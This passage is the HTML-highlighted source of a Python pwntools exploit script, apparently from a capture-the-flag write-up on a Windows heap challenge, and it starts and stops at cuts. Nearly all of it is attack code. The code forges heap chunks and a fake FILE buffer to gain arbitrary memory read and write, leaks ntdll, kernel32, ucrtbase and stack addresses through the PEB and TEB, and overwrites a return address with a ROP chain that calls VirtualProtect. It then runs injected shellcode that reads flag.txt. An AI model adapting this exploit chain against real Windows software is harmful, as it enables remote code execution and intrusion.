class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"5"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(idx,size,ret=True)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"5"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> ret :</span><br><span class="line">        r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr=None,heapoff=None)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        openfile()</span><br><span class="line">    allocate(<span class="number">0x228</span>,<span class="number">1338</span>)</span><br><span class="line">    allocate(<span class="number">0x228</span>,<span class="number">1337</span>)</span><br><span class="line">    allocate(<span class="number">0x228</span>,<span class="number">1336</span>)</span><br><span class="line">    edit(<span class="number">1337</span>,<span class="string">"a"</span>*<span class="number">0x228</span>)</span><br><span class="line">    show(<span class="number">1337</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"a"</span>*<span class="number">0x228</span>)</span><br><span class="line">    cookie = (u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) ^ <span class="number">0x2322010023</span>)  &amp; <span class="number">0xffffffffffff</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"cookie:"</span>,hex(cookie)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0x268</span>,<span class="number">1332</span>)</span><br><span class="line">    allocate(<span class="number">0x5a0</span>,<span class="number">1331</span>)</span><br><span class="line">    allocate(<span class="number">0x1000</span>,<span class="number">1330</span>)</span><br><span class="line">    allocate(<span class="number">0x280</span>,<span class="number">1333</span>)</span><br><span class="line">    allocate(<span class="number">0x280</span>,cookie^<span class="number">0x37010137</span>)</span><br><span class="line">   <span class="comment"># allocate(0x163,4141)</span></span><br><span class="line">    openfile()</span><br><span class="line">    readfile(<span class="number">1332</span>,<span class="number">0x268</span>)</span><br><span class="line">    fakechunk = <span class="number">0x27ae0101ae</span> ^ cookie</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    edit(<span class="number">1332</span>,<span class="string">"b"</span>*<span class="number">0x268</span> + p64(fakechunk)[:<span class="number">6</span>])</span><br><span class="line">    free(<span class="number">1331</span>)</span><br><span class="line">    allocate(<span class="number">0x5a0</span>,<span class="number">1331</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1330</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    heap_var = u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">if</span> heap_var == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"fuck heap 0"</span></span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">if</span> (heap_var &amp; <span class="number">0xffff</span>) == <span class="number">0x150</span> :</span><br><span class="line">        heap = heap_var - <span class="number">0x150</span></span><br><span class="line">    <span class="keyword">elif</span> heap_var &lt; <span class="number">0x10000</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"fuck heap &lt; 0x10000"</span></span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        heap = (heap_var &amp; <span class="number">0xffffffffffff0000</span>)  - <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"heap:"</span>,hex(heap)</span><br><span class="line">    var = heap_var</span><br><span class="line">    <span class="keyword">while</span> var == heap_var :</span><br><span class="line">        openfile()</span><br><span class="line">        show(<span class="number">1330</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        var = u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) </span><br><span class="line">    subsegment = heap + <span class="number">0x021e80</span></span><br><span class="line">    reserve = heap + <span class="number">0x28b40</span></span><br><span class="line">    size_idx = <span class="number">0xc</span></span><br><span class="line">    sig = <span class="number">0xf0e0d0c0</span></span><br><span class="line">    fake_userdata = p64(subsegment) + p64(reserve) + p32(size_idx) + p32(sig) </span><br><span class="line">    fake_userdata += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    filebuffer = <span class="number">0xbeefdad0000</span></span><br><span class="line">    ptr = filebuffer+<span class="number">0x20</span></span><br><span class="line">    base = filebuffer+<span class="number">0x20</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    flag = <span class="number">0x2049</span></span><br><span class="line">    fd = <span class="number">0</span></span><br><span class="line">    pad = <span class="number">0</span></span><br><span class="line">    bufsize = <span class="number">0x800</span></span><br><span class="line">    obj = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(<span class="number">0</span>)</span><br><span class="line">    obj += p64(<span class="number">0xffffffffffffffff</span>) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">1330</span>,fake_userdata + obj*<span class="number">0x28</span>)</span><br><span class="line">    readfile(<span class="number">1338</span>,<span class="number">0x8</span>,<span class="keyword">False</span>)</span><br><span class="line">    magic = <span class="number">0xddaabeef1acd</span></span><br><span class="line">    <span class="comment">#stage1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> addr <span class="keyword">and</span> <span class="keyword">not</span> heapoff:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        r.send(p64(heap+<span class="number">0x2c0</span>))</span><br><span class="line"></span><br><span class="line">        r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"3"</span>)</span><br><span class="line">        show(<span class="number">1338</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        <span class="keyword">return</span> u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) <span class="number">-0x163d50</span></span><br><span class="line">    <span class="keyword">elif</span> heapoff:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        r.send(p64(heap+heapoff))</span><br><span class="line">        r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">        r.sendline(<span class="string">"3"</span>)</span><br><span class="line">        show(<span class="number">1338</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        <span class="keyword">return</span> u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        r.send(p64(addr))</span><br><span class="line">        r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"3"</span>)</span><br><span class="line">        show(<span class="number">1338</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        <span class="keyword">return</span> u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        openfile()</span><br><span class="line">    allocate(<span class="number">0x228</span>,<span class="number">1338</span>)</span><br><span class="line">    allocate(<span class="number">0x228</span>,<span class="number">1337</span>)</span><br><span class="line">    allocate(<span class="number">0x228</span>,<span class="number">1336</span>)</span><br><span class="line">    edit(<span class="number">1337</span>,<span class="string">"a"</span>*<span class="number">0x228</span>)</span><br><span class="line">    show(<span class="number">1337</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"a"</span>*<span class="number">0x228</span>)</span><br><span class="line">    cookie = (u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) ^ <span class="number">0x2322010023</span>)  &amp; <span class="number">0xffffffffffff</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"cookie:"</span>,hex(cookie)</span><br><span class="line">    allocate(<span class="number">0x268</span>,<span class="number">1332</span>)</span><br><span class="line">    allocate(<span class="number">0x5a0</span>,<span class="number">1331</span>)</span><br><span class="line">    allocate(<span class="number">0x1000</span>,<span class="number">1330</span>)</span><br><span class="line">    allocate(<span class="number">0x280</span>,<span class="number">1333</span>)</span><br><span class="line">    allocate(<span class="number">0x280</span>,cookie^<span class="number">0x37010137</span>)</span><br><span class="line">    <span class="comment">#allocate(0x163,4141)</span></span><br><span class="line">    openfile()</span><br><span class="line">    readfile(<span class="number">1332</span>,<span class="number">0x268</span>)</span><br><span class="line">    fakechunk = <span class="number">0x27ae0101ae</span> ^ cookie</span><br><span class="line">    edit(<span class="number">1332</span>,<span class="string">"b"</span>*<span class="number">0x268</span> + p64(fakechunk)[:<span class="number">6</span>])</span><br><span class="line">    free(<span class="number">1331</span>)</span><br><span class="line">    allocate(<span class="number">0x5a0</span>,<span class="number">1331</span>)</span><br><span class="line">    show(<span class="number">1330</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    heap_var = u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> heap_var == <span class="number">0</span> :</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">if</span> (heap_var &amp; <span class="number">0xffff</span>) == <span class="number">0x150</span> :</span><br><span class="line">        heap = heap_var - <span class="number">0x150</span></span><br><span class="line">    <span class="keyword">elif</span> heap_var &lt; <span class="number">0x10000</span>:</span><br><span class="line">        <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        heap = (heap_var &amp; <span class="number">0xffffffffffff0000</span>) - <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"heap:"</span>,hex(heap)</span><br><span class="line">    var = heap_var</span><br><span class="line">    <span class="keyword">while</span> var == heap_var :</span><br><span class="line">        openfile()</span><br><span class="line">        show(<span class="number">1330</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        var = u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) </span><br><span class="line">    subsegment = heap + <span class="number">0x021e80</span></span><br><span class="line">    reserve = heap + <span class="number">0x28b40</span></span><br><span class="line">    size_idx = <span class="number">0xc</span></span><br><span class="line">    sig = <span class="number">0xf0e0d0c0</span></span><br><span class="line">    fake_userdata = p64(subsegment) + p64(reserve) + p32(size_idx) + p32(sig) </span><br><span class="line">    fake_userdata += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    filebuffer = <span class="number">0xbeefdad0000</span></span><br><span class="line">    <span class="keyword">global</span> ucrtbase</span><br><span class="line">    pioinfo = ucrtbase  + <span class="number">0xeb750</span></span><br><span class="line">    ptr = filebuffer + <span class="number">0x20</span></span><br><span class="line">    base = filebuffer + <span class="number">0x20</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    flag = <span class="number">0x2049</span></span><br><span class="line">    fd = <span class="number">0</span></span><br><span class="line">    pad = <span class="number">0</span></span><br><span class="line">    bufsize = <span class="number">0x800</span></span><br><span class="line">    obj =p64(<span class="number">0</span>)*<span class="number">2</span> + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(<span class="number">0</span>)</span><br><span class="line">    obj += p64(<span class="number">0xffffffffffffffff</span>) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">1330</span>,fake_userdata + obj*<span class="number">0x28</span>)</span><br><span class="line">    readfile(<span class="number">1338</span>,<span class="number">8</span>,<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">global</span> pioinfo_off</span><br><span class="line">    magic = <span class="number">0xddaabeef1acd</span></span><br><span class="line">    r.send(p64(heap+pioinfo_off+<span class="number">0x38</span>))</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    edit(<span class="number">1338</span>,p8(<span class="number">0x09</span>))</span><br><span class="line">    allocate(<span class="number">0x510</span>,<span class="number">4242</span>)</span><br><span class="line">    target = filebuffer + <span class="number">0x138</span></span><br><span class="line">    free(<span class="number">1333</span>)</span><br><span class="line">    allocate(<span class="number">0x280</span>,<span class="number">4343</span>)</span><br><span class="line">    edit(<span class="number">4242</span>,<span class="string">"a"</span>*<span class="number">0x288</span> + p64(<span class="number">0x2929000029</span>^cookie) + p64(target<span class="number">-8</span>) + p64(target))</span><br><span class="line">    allocate(<span class="number">0x280</span>,<span class="number">5566</span>)</span><br><span class="line">    fake_filebuffer = flat([magic,<span class="number">0x200</span>,<span class="number">0xda</span>,magic,filebuffer])</span><br><span class="line">    edit(cookie^<span class="number">0x37010137</span>, p64(filebuffer) + fake_filebuffer)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        fake_filebuffer += flat([magic,<span class="number">0x200</span>,<span class="number">0xda</span> + i,magic,filebuffer])</span><br><span class="line">    edit(<span class="number">0xda</span>,fake_filebuffer)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">readmem</span><span class="params">(addr)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">2</span> == <span class="number">0</span> :</span><br><span class="line">            fake_filebuffer = flat([magic,<span class="number">0x200</span>,<span class="number">0xda</span>,magic,addr]) + flat([magic,<span class="number">0x200</span>,<span class="number">0xdada</span>,magic,filebuffer])</span><br><span class="line">            edit(<span class="number">0xda</span>,fake_filebuffer)</span><br><span class="line">            show(<span class="number">0xda</span>)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            fake_filebuffer = flat([magic,<span class="number">0x200</span>,<span class="number">0xda</span>,magic,filebuffer]) + flat([magic,<span class="number">0x200</span>,<span class="number">0xdada</span>,magic,addr])</span><br><span class="line">            edit(<span class="number">0xdada</span>,fake_filebuffer)</span><br><span class="line">            show(<span class="number">0xdada</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">        <span class="keyword">return</span> u64(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">global</span> ntdll </span><br><span class="line">    <span class="keyword">if</span> ntdll == <span class="number">0</span> :</span><br><span class="line">        ntdll = readmem(heap+<span class="number">0x2c0</span>) - <span class="number">0x163d50</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"ntdll:"</span>,hex(ntdll)</span><br><span class="line">    peb = readmem(ntdll+<span class="number">0x165348</span>) - <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"peb:"</span>,hex(peb)</span><br><span class="line">    <span class="keyword">global</span> Pebldr </span><br><span class="line">    <span class="keyword">if</span> Pebldr == <span class="number">0</span> :</span><br><span class="line">        Pebldr = ntdll+ <span class="number">0x1653c0</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"PebLdr:"</span>,hex(Pebldr)</span><br><span class="line">    <span class="keyword">global</span> bin_base</span><br><span class="line">    <span class="keyword">if</span> bin_base == <span class="number">0</span> :</span><br><span class="line">        imoml = readmem(Pebldr+<span class="number">0x20</span>)</span><br><span class="line">        bin_base = readmem(imoml+<span class="number">0x28</span>) - <span class="number">0x1b80</span> - <span class="number">0x70</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"bin_base:"</span>,hex(bin_base)</span><br><span class="line">    iat = bin_base + <span class="number">0x3000</span></span><br><span class="line"></span><br><span class="line">    kernel32 = readmem(iat+<span class="number">8</span>) - <span class="number">0x1e690</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"kernel32:"</span>,hex(kernel32)</span><br><span class="line">    ucrtbase = readmem(iat+<span class="number">0x110</span>) - <span class="number">0x6f1e0</span></span><br><span class="line">    teb = peb + <span class="number">0x1000</span></span><br><span class="line">    stack = readmem(teb+<span class="number">0x10</span>+<span class="number">1</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"stack:"</span>,hex(stack)</span><br><span class="line">    start = stack+<span class="number">0x3ff8</span></span><br><span class="line">    printf_ret = bin_base + <span class="number">0x17c4</span></span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2000</span>/<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            val = readmem(start-i*<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"search : %d"</span> % i</span><br><span class="line">            <span class="keyword">if</span> val == printf_ret :</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"found !"</span></span><br><span class="line">                ret_addr = start - i*<span class="number">8</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> ret_addr == <span class="number">0</span> :</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret_addr:"</span> ,hex(ret_addr)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writemem</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        <span class="keyword">if</span> count % <span class="number">2</span> == <span class="number">0</span> :</span><br><span class="line">            fake_filebuffer = flat([magic,<span class="number">0x200</span>,<span class="number">0xda</span>,magic,addr]) + flat([magic,<span class="number">0x200</span>,<span class="number">0xdada</span>,magic,filebuffer]) + flat([magic,<span class="number">0x200</span>,<span class="number">0xddaa</span>,magic,addr]) </span><br><span class="line">            edit(<span class="number">0xda</span>,fake_filebuffer)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            fake_filebuffer = flat([magic,<span class="number">0x200</span>,<span class="number">0xda</span>,magic,filebuffer]) + flat([magic,<span class="number">0x200</span>,<span class="number">0xdada</span>,magic,addr])+ flat([magic,<span class="number">0x200</span>,<span class="number">0xddaa</span>,magic,addr])</span><br><span class="line">            edit(<span class="number">0xdada</span>,fake_filebuffer)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        edit(<span class="number">0xddaa</span>,data)</span><br><span class="line">    buf = bin_base + <span class="number">0x5000</span> + <span class="number">0x800</span></span><br><span class="line">    writemem(buf,<span class="string">"flag.txt\x00"</span>)</span><br><span class="line">    </span><br><span class="line">    pop_rdx_rcx_r8_r9_r10_r11 = ntdll + <span class="number">0x8c450</span></span><br><span class="line">    winexec = kernel32 + <span class="number">0x5e970</span></span><br><span class="line">    virutalprotect = kernel32 + <span class="number">0x1ad00</span></span><br><span class="line">    heapcreate = kernel32 + <span class="number">0x1e500</span></span><br><span class="line">    processheap = peb+<span class="number">0x30</span></span><br><span class="line"><span class="comment">#    _open = ucrtbase + 0xa2a30</span></span><br><span class="line">    _open = ucrtbase + <span class="number">0xa1ae0</span></span><br><span class="line"><span class="comment">#    _read = ucrtbase +  0x16270</span></span><br><span class="line">    _read = ucrtbase +  <span class="number">0x16140</span></span><br><span class="line">    _sleep = ucrtbase + <span class="number">0xb0ef0</span></span><br><span class="line">    _write = ucrtbase + <span class="number">0x14b30</span></span><br><span class="line">    _exit = ucrtbase + <span class="number">0x6f1a0</span></span><br><span class="line">    crtheap = ucrtbase + <span class="number">0xeb570</span></span><br><span class="line">    rop = flat([pop_rdx_rcx_r8_r9_r10_r11,<span class="number">0x1000</span>,bin_base+<span class="number">0x5000</span>,<span class="number">0x40</span>,buf+<span class="number">0x40</span>,<span class="number">0</span>,<span class="number">0</span>,virutalprotect,bin_base+<span class="number">0x5000</span>+<span class="number">0x900</span>])</span><br><span class="line">    sc = <span class="string">"\x90"</span>*<span class="number">0x20</span> +  asm(<span class="string">"""</span></span><br><span class="line"><span class="string">        xor rcx,rcx</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        xor r8,r8</span></span><br><span class="line"><span class="string">        xor r9,r9</span></span><br><span class="line"><span class="string">        xor rdi,rdi</span></span><br><span class="line"><span class="string">        mov cl,2</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        call rdi</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        mov qword ptr [rdi],rax</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        mov qword ptr [rdi],rax</span></span><br><span class="line"><span class="string">        sub rsp,0x1000</span></span><br><span class="line"><span class="string">    open :</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        mov rcx,0x%x</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        call rdi</span></span><br><span class="line"><span class="string">    read:</span></span><br><span class="line"><span class="string">        mov rcx,rax</span></span><br><span class="line"><span class="string">        mov rdx,0x%x</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        mov r8,0x40</span></span><br><span class="line"><span class="string">        call rdi</span></span><br><span class="line"><span class="string">    write :</span></span><br><span class="line"><span class="string">        mov r8,rax</span></span><br><span class="line"><span class="string">        mov rdx,0x%x</span></span><br><span class="line"><span class="string">        xor rcx,rcx</span></span><br><span class="line"><span class="string">        inc rcx</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        call rdi</span></span><br><span class="line"><span class="string">    sleep:</span></span><br><span class="line"><span class="string">        mov rcx,20</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        call rdi</span></span><br><span class="line"><span class="string">    exit:</span></span><br><span class="line"><span class="string">        mov rdi,0x%x</span></span><br><span class="line"><span class="string">        call rdi</span></span><br><span class="line"><span class="string">    """</span> % (heapcreate,processheap,crtheap,_open,buf,buf,_read,buf,_write,_sleep,_exit))</span><br><span class="line">    writemem(bin_base+<span class="number">0x5000</span>+<span class="number">0x900</span>,sc)</span><br><span class="line">    writemem(ret_addr,rop)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">ntdll = <span class="number">0</span></span><br><span class="line">imoml_off = <span class="number">0</span></span><br><span class="line">bin_base = <span class="number">0</span></span><br><span class="line">Pebldr = <span class="number">0</span></span><br><span class="line">ucrtbase = <span class="number">0</span></span><br><span class="line">pioinfo_off = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ntdll == <span class="number">0</span> <span class="keyword">and</span> ucrtbase == <span class="number">0</span> :</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            r = remote(host,port)</span><br><span class="line">            ntdll = leak() - <span class="number">0x20</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"ntdll"</span>,hex(ntdll)</span><br><span class="line">            r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">            r.sendline(<span class="string">"6"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            r.close()</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ntdll"</span>,hex(ntdll)</span><br><span class="line"><span class="keyword">if</span> imoml_off == <span class="number">0</span> :</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line"></span><br><span class="line">            r = remote(host,port)</span><br><span class="line">            Pebldr = ntdll + <span class="number">0x1653c0</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"PebLdr:"</span>,hex(Pebldr)</span><br><span class="line">            imoml = leak(Pebldr+<span class="number">0x20</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"imoml:"</span>,hex(imoml)</span><br><span class="line">            imoml_off = imoml &amp; <span class="number">0xffff</span></span><br><span class="line">            r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">            r.sendline(<span class="string">"6"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            r.close()</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"imoml:"</span>,hex(imoml_off)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bin_base == <span class="number">0</span> <span class="keyword">and</span> ucrtbase == <span class="number">0</span>:</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            r = remote(host,port)</span><br><span class="line">            bin_base = leak(<span class="keyword">None</span>,imoml_off+<span class="number">0x28</span>) - <span class="number">0x1bf0</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"bin_base:"</span>,hex(bin_base) </span><br><span class="line">            r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">            r.sendline(<span class="string">"6"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            r.close()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"bin_base:"</span>,hex(bin_base)</span><br><span class="line"><span class="keyword">if</span> ucrtbase == <span class="number">0</span> :</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            r = remote(host,port)</span><br><span class="line">            iat = bin_base + <span class="number">0x3000</span></span><br><span class="line">            ucrtbase = leak(iat+<span class="number">0x110</span>) - <span class="number">0x6f1e0</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"ucrtbase:"</span>,hex(ucrtbase) </span><br><span class="line">            r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">            r.sendline(<span class="string">"6"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span 